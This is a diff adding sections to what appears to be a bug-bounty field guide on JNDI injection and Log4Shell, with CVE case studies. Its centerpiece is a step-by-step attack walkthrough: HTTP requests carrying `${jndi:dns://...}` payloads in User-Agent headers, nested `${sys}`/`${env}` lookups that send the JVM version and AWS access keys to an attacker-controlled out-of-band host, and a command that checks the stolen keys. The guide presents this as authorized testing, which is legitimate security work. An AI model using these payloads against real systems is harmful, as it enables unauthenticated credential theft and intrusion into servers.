@@ -284,6 +284,105 @@ CVE-2021-4104   — log4j 1.x JMSAppender JNDI (needs config control). CVE-2019-
 ```
 Detection order: fire the §4 canary → if callback, you're on ≤2.14.1 (or 2.15 for localhost/exfil). Confirm the version from callbacks (`${env}` exfil of the jar version) or error pages.
 
+> **The 2.15 subtlety worth knowing (CVE-2021-45046).** 2.15.0 restricted JNDI lookups to `localhost` in the *message*, but if attacker input reaches a **non-message** part of the log pattern — most commonly the **Thread Context Map (MDC)** re-used in a `PatternLayout` with `${ctx:loginId}` / `%X` / `%mdc` — the localhost restriction is bypassed and you get outbound JNDI again → **RCE in some configs, and `${env}` data exfil in all of them.** That's why Apache said `formatMsgNoLookups=true` was **not** a sufficient fix and why "we upgraded to 2.15" is not "we're safe" — the CVSS for 45046 was ultimately raised to **9.0**. Only **2.16** (lookups removed) and later actually close it.
+
+---
+
+# 13.5 The full attack, end-to-end — blind canary → confirm → `${env}` secret exfil on a "patched" 2.15 host
+
+> *This is the flagship worked example.* It deliberately shows the JNDI-distinct money move — **stealing cloud credentials over DNS with zero code execution** on a host the defender believes is patched — because the gadget-shell path (technique B) is transcripted in the [../Deserialization/](../Deserialization/) kit. Every value here is a benign marker against my own OOB host; nothing runs on the target.
+
+**Setup.** OOB oracle: `mytoken.oast.fun` (interactsh). Target: a Java login API. I've fingerprinted the stack as Java (Spring Boot whitelabel error page, `JSESSIONID`). I do NOT yet know the Log4j version — the callbacks will tell me.
+
+**Step 1 — spray a per-input DNS canary (§4–§5).** One request per input, each token self-labels the input. Here's the winning one, in the `User-Agent` (failed logins are logged verbatim by countless apps):
+
+```http
+POST /api/login HTTP/1.1
+Host: target.example
+User-Agent: ${jndi:dns://ua-7f3a1c.mytoken.oast.fun/a}
+Content-Type: application/json
+Content-Length: 41
+
+{"username":"nobody","password":"wrong"}
+```
+```
+HTTP/1.1 401 Unauthorized
+{"error":"invalid credentials"}
+```
+The 401 tells me nothing — this bug is **blind**. I watch interactsh:
+
+```
+[interactsh] DNS  A?  ua-7f3a1c.mytoken.oast.fun   from 203.0.113.44 (target egress)   14:02:10
+```
+**A DNS lookup, carrying my `ua-7f3a1c` token, from the target's egress IP.** That single line is the finding: the `User-Agent` reaches a live Log4j sink — **blind, unauthenticated, confirmed.** No LDAP connection followed (I only sent `dns://`), so I know nothing yet about egress to LDAP.
+
+**Step 2 — is the RCE path open, or is this a patched-for-RCE host?** I re-fire the same input with the `ldap://` variant to test whether object delivery egress is open:
+
+```http
+User-Agent: ${jndi:ldap://ldap-7f3a1c.mytoken.oast.fun/a}
+```
+```
+[interactsh] DNS  A?  ldap-7f3a1c.mytoken.oast.fun   from 203.0.113.44   14:04:31
+   (no LDAP TCP connection to :389/:1389 ever arrives)
+```
+DNS resolves but **no LDAP connect-back**. Two possibilities: LDAP egress is firewalled, or the Log4j is 2.15 (message lookups restricted to localhost so the remote host is never contacted for object delivery). Either way, technique A/B/C object delivery is off the table on this path — but **lookups still resolve**, which the DNS hit just proved. That's the pivot signal.
+
+**Step 3 — fingerprint the version and JVM blindly, over DNS (§4, arsenal §4).** Nest resolvable lookups inside the hostname so the values come back as DNS labels:
+
+```http
+User-Agent: ${jndi:dns://v-${sys:java.version}.mytoken.oast.fun/a}
+```
+```
+[interactsh] DNS  A?  v-1-8-0-312.mytoken.oast.fun   from 203.0.113.44   14:06:02
+```
+(interactsh normalises dots in the label; the JVM is **Java 8u312**.) Java 8u312 is post-Oct-2018, so `trustURLCodebase=false` — remote-codebase (technique A) is dead here even if LDAP egress were open. Combined with "DNS resolves, LDAP doesn't," this reads as a **2.15-class, lookups-still-fire** host. Time to cash out the way this class uniquely allows: **exfil, not exec.**
+
+**Step 4 — steal the cloud credentials over DNS (§11).** I nest an env-var lookup inside the DNS name. The value is resolved *first*, then used as the label that leaves the network:
+
+```http
+User-Agent: ${jndi:dns://k.${env:AWS_ACCESS_KEY_ID}.mytoken.oast.fun/a}
+```
+```
+[interactsh] DNS  A?  k.AKIAY44XT7EXAMPLE7.mytoken.oast.fun   from 203.0.113.44   14:08:17
+```
+The **AWS access key ID walked out as a DNS label.** I take exactly one more — the secret — then stop (long/odd-char values would need base32 + label-splitting; this one is DNS-safe):
+
+```http
+User-Agent: ${jndi:dns://s.${env:AWS_SECRET_ACCESS_KEY}.mytoken.oast.fun/a}
+```
+```
+[interactsh] DNS  A?  s.wJalr<...redacted...>EXAMPLEKEY.mytoken.oast.fun   from 203.0.113.44   14:08:41
+```
+
+**Step 5 — validate read-only, then STOP.** To prove the creds are live *without touching the target's data*, one read-only STS call from my own box:
+```bash
+$ AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=wJalr... aws sts get-caller-identity
+{ "Account":"1234...", "Arn":"arn:aws:iam::1234...:user/app-prod-logger" }
+```
+Confirmed live IAM identity. **I do not enumerate S3, I do not assume roles, I do not run a single command on the target.** The report writes itself: a "patched" 2.15 host leaked production AWS credentials over DNS through a logged `User-Agent`, with no code execution required.
+
+**Why this beats chasing a shell here.** On this host a shell wasn't available (post-2018 JDK + no LDAP egress), and a defender who saw "2.15, formatMsgNoLookups set" believed they were done. The `${env}` exfil path — **the thing JNDI/Log4j can do that a plain deserialization bug can't** — turned a "mitigated" checkbox into stolen prod cloud keys. **Same one primitive** (make the JVM resolve my URL); the JVM's patch state just routed me from "exec" to "exfil."
+
+---
+
+# 13.6 Real-world Log4Shell / JNDI case studies (verified)
+
+> Facts below were re-verified against primary sources (Apache advisories, NVD/CVE, Veracode, Black Hat) — cited in the References appendix.
+
+- **The class was born at Black Hat USA 2016 — five years before Log4Shell.** Alvaro Muñoz & Oleksandr Mirosh's *"A Journey From JNDI/LDAP Manipulation to Remote Code Execution Dream Land"* laid out the exact `lookup()` → LDAP-referral → remote-class / serialized-gadget RCE mechanic. The primitive sat in the open for half a decade; Log4Shell (2021) was "old technique, catastrophic new reach" — the reach came from Log4j performing the lookup on *anything it logged.*
+
+- **CVE-2021-44228 (Log4Shell), CVSS 10.0, Dec 2021.** `${jndi:…}` message-lookup RCE in `log4j-core` 2.0-beta9 → 2.14.1. What made it a once-in-a-decade event was not the technique but that Log4j is a *transitive* dependency in a colossal share of Java software — the payload only had to be **logged**, so it fired from `User-Agent` strings, iPhone device names, Minecraft chat, and Tesla dashboards alike. Mass exploitation began within hours of disclosure.
+
+- **CVE-2021-45046 — why "we're on 2.15" was wrong.** 2.15.0's fix restricted lookups to localhost *in the message*, but attacker input reaching a **non-message** log-pattern element (the Thread Context Map / MDC, re-emitted via `${ctx:...}` / `%X` / `%mdc`) bypassed it → outbound JNDI again, RCE in some configs and `${env}` exfil in all. The CVSS was raised to **9.0** and Apache explicitly stated `formatMsgNoLookups=true` was **not** a sufficient fix — only 2.16 (lookups removed) closed it. This is the real-world root of §13.5's exfil path.
+
+- **CVE-2021-45105 (DoS, 2.16→fixed 2.17.0) and CVE-2021-44832 (JDBCAppender RCE, fixed 2.17.1).** The tail of the chain: even after RCE was closed, a self-referential recursive lookup crashed 2.16 (StackOverflow), and an attacker with **config-write** could still reach RCE via a JNDI JDBCAppender datasource. The lesson for a tester: "they patched Log4Shell" can mean any of four different states — fingerprint the *exact* version.
+
+- **The modern-JDK bypass is not theoretical (Veracode / Michael Stepankin).** After Oct-2018 JDKs shipped `trustURLCodebase=false` (6u211/7u201/8u191/11.0.1), remote-codebase delivery (technique A) died — but Stepankin's *"Exploiting JNDI Injections in Java"* showed the **local-factory `BeanFactory` + EL** path (technique C) reaches RCE using only classes already on the classpath (Tomcat's `org.apache.naming.factory.BeanFactory`). So "modern JDK" is **not** a mitigation for the RCE — it only changes *which* technique you use. Report the technique so a triager can't wrongly close it as "mitigated by JDK version."
+
+- **Appliances ran ancient embedded JVMs.** VMware Horizon/vCenter, Ubiquiti/UniFi, MobileIron and a long tail of network gear were mass-compromised — many on pre-2018 JVMs where the *easiest* technique (A, remote-codebase) still landed a shell directly. The takeaway: on embedded/appliance targets, don't assume a modern-JDK mitigation.
+
+---
+
 # 14. Other JNDI-vulnerable products (each its own report)
 
 ```
@@ -503,7 +602,7 @@ ALWAYS: OOB callback carrying YOUR token = proof (not reflection) · benign only
 - **[JNDI_ARSENAL.md](JNDI_ARSENAL.md)** — payload matrix (protocols · nested-lookup WAF bypass · `${env}` exfil), inject-point list, tools.
 - **[JNDI_CHECKLIST.md](JNDI_CHECKLIST.md)** — phase-by-phase + auto-reject.
 - **[JNDI_REPORT_TEMPLATE.md](JNDI_REPORT_TEMPLATE.md)** — report skeleton (OOB-callback proof).
-- **[JNDI_Zero_to_Expert.md](JNDI_Zero_to_Expert.md)** — 100-question study + field reference.
+- **[JNDI_Zero_to_Expert.md](JNDI_Zero_to_Expert.md)** — 120-question study + field reference (incl. interview & scenario levels).
 - **[poc/](poc/)** — `jndi_probe.py` (per-input token spray) · `payload_gen.py` (payload matrix) · `callback_listener.py` (benign connection logger).
 
 > **Final reminder — the one rule that pays:** JNDI/Log4Shell is confirmed when the **target's own infrastructure calls back to your OOB host carrying your unique token** — that blind callback is already **Critical unauthenticated RCE** (or, on a partly-patched host, `${env}` **secret theft over DNS**). Prove *that*, optionally one benign command, and stop. You never need a shell to win this one.
